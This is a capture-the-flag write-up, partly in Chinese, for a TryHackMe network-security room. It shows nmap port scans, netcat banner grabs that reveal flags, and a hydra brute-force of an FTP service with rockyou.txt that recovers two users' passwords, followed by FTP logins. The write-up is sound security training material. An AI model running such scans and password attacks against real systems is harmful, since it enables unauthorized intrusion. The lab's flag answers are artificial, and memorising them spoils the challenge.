> https://tryhackme.com/room/netsecchallenge
> #Offensive #Challenge

# Task 1 Introduction

前置介绍

# Task 2 Challenge Questions

## What is the highest port number being open less than 10,000?
```shell
┌──(randark㉿kali)-[~]
└─$ sudo nmap -vv 10.10.234.192
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 19:55 CST
Initiating Ping Scan at 19:55
Scanning 10.10.234.192 [4 ports]
Completed Ping Scan at 19:55, 0.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:55
Completed Parallel DNS resolution of 1 host. at 19:55, 2.19s elapsed
Initiating SYN Stealth Scan at 19:55
Scanning 10.10.234.192 [1000 ports]
Discovered open port 22/tcp on 10.10.234.192
Discovered open port 8080/tcp on 10.10.234.192
Discovered open port 445/tcp on 10.10.234.192
Discovered open port 80/tcp on 10.10.234.192
Discovered open port 139/tcp on 10.10.234.192
Completed SYN Stealth Scan at 19:55, 2.58s elapsed (1000 total ports)
Nmap scan report for 10.10.234.192
Host is up, received echo-reply ttl 63 (0.25s latency).
Scanned at 2023-01-09 19:55:51 CST for 3s
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 63
80/tcp   open  http         syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
8080/tcp open  http-proxy   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.17 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.048KB)
```

## There is an open port outside the common 1000 ports; it is above 10,000. What is it?
```shell
┌──(randark㉿kali)-[~]
└─$ sudo nmap -vv 10.10.234.192 -p1-15000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 19:56 CST
Initiating Ping Scan at 19:56
Scanning 10.10.234.192 [4 ports]
Completed Ping Scan at 19:56, 0.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:56
Completed Parallel DNS resolution of 1 host. at 19:56, 2.20s elapsed
Initiating SYN Stealth Scan at 19:56
Scanning 10.10.234.192 [15000 ports]
Discovered open port 445/tcp on 10.10.234.192
Discovered open port 80/tcp on 10.10.234.192
Discovered open port 22/tcp on 10.10.234.192
Discovered open port 139/tcp on 10.10.234.192
Discovered open port 8080/tcp on 10.10.234.192
SYN Stealth Scan Timing: About 9.85% done; ETC: 20:01 (0:04:44 remaining)
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 11.36% done; ETC: 20:01 (0:04:41 remaining)
SYN Stealth Scan Timing: About 19.97% done; ETC: 20:01 (0:04:25 remaining)
SYN Stealth Scan Timing: About 29.58% done; ETC: 20:01 (0:03:49 remaining)
SYN Stealth Scan Timing: About 37.88% done; ETC: 20:01 (0:03:27 remaining)
SYN Stealth Scan Timing: About 47.50% done; ETC: 20:01 (0:02:52 remaining)
Stats: 0:03:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 55.54% done; ETC: 20:01 (0:02:24 remaining)
SYN Stealth Scan Timing: About 65.85% done; ETC: 20:01 (0:01:49 remaining)
Stats: 0:03:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 70.60% done; ETC: 20:01 (0:01:36 remaining)
SYN Stealth Scan Timing: About 79.86% done; ETC: 20:01 (0:01:06 remaining)
SYN Stealth Scan Timing: About 88.58% done; ETC: 20:01 (0:00:37 remaining)
Discovered open port 10021/tcp on 10.10.234.192
Completed SYN Stealth Scan at 20:02, 347.70s elapsed (15000 total ports)
Nmap scan report for 10.10.234.192
Host is up, received echo-reply ttl 63 (0.25s latency).
Scanned at 2023-01-09 19:56:23 CST for 347s
Not shown: 14994 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 63
80/tcp    open  http         syn-ack ttl 63
139/tcp   open  netbios-ssn  syn-ack ttl 63
445/tcp   open  microsoft-ds syn-ack ttl 63
8080/tcp  open  http-proxy   syn-ack ttl 63
10021/tcp open  unknown      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 350.31 seconds
           Raw packets sent: 17370 (764.256KB) | Rcvd: 17133 (685.697KB)
```

## How many TCP ports are open?
同上

## What is the flag hidden in the HTTP server header?
```shell
┌──(randark㉿kali)-[~]
└─$ nc 10.10.234.192 80              
GET / HTTP/1.1

HTTP/1.0 400 Bad Request
Content-Type: text/html
Content-Length: 345
Connection: close
Date: Mon, 09 Jan 2023 11:57:31 GMT
Server: lighttpd THM{web_server_25352}

<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>400 Bad Request</title>
 </head>
 <body>
  <h1>400 Bad Request</h1>
 </body>
</html>
```

## What is the flag hidden in the SSH server header?
```shell
┌──(randark㉿kali)-[~]
└─$ nc 10.10.234.192 22
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

## We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
从上面就可得知，FTP的非正常端口为`10021`
```shell
┌──(randark㉿kali)-[~]
└─$ nc 10.10.234.192 10021                        
220 (vsFTPd 3.0.3)
```

## We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?
```shell
┌──(randark㉿kali)-[~]
└─$ hydra -L tryhackme/user.txt -P wordlists/rockyou.txt 10.10.234.192 ftp -s 10021
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-09 20:20:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688796 login tries (l:2/p:14344398), ~1793050 tries per task
[DATA] attacking ftp://10.10.234.192:10021/
[10021][ftp] host: 10.10.234.192   login: eddie   password: jordan
[10021][ftp] host: 10.10.234.192   login: quinn   password: andrea
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-09 20:20:42
                                                                                                                                                                                                                                           
┌──(randark㉿kali)-[~]
└─$ ftp 10.10.234.192 10021
Connected to 10.10.234.192.
220 (vsFTPd 3.0.3)
Name (10.10.234.192:randark): eddie
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30922|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> exit
221 Goodbye.
                                                                                                                                                                                                                                           
┌──(randark㉿kali)-[~]
└─$ ftp 10.10.234.192 10021
Connected to 10.10.234.192.
220 (vsFTPd 3.0.3)
Name (10.10.234.192:randark): quinn
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30581|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30303|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |**********************************************************************************************************************************************************************************************|    18        0.05 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.03 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                                                                                           
┌──(randark㉿kali)-[~]
└─$ cat ftp_flag.txt      
THM{321452667098}
```

## Browsing to `http://10.10.234.192:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?
执行空扫描就可以出结果
```shell
┌──(randark㉿kali)-[~]
└─$ sudo nmap -sN -vv 10.10.234.192
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 20:25 CST
Initiating Ping Scan at 20:25
Scanning 10.10.234.192 [4 ports]
Completed Ping Scan at 20:25, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:25
Completed Parallel DNS resolution of 1 host. at 20:25, 0.03s elapsed
Initiating NULL Scan at 20:25
Scanning 10.10.234.192 [1000 ports]
......
```
![[Pasted image 20230109202624.png]]

# Task 3 Summary

总结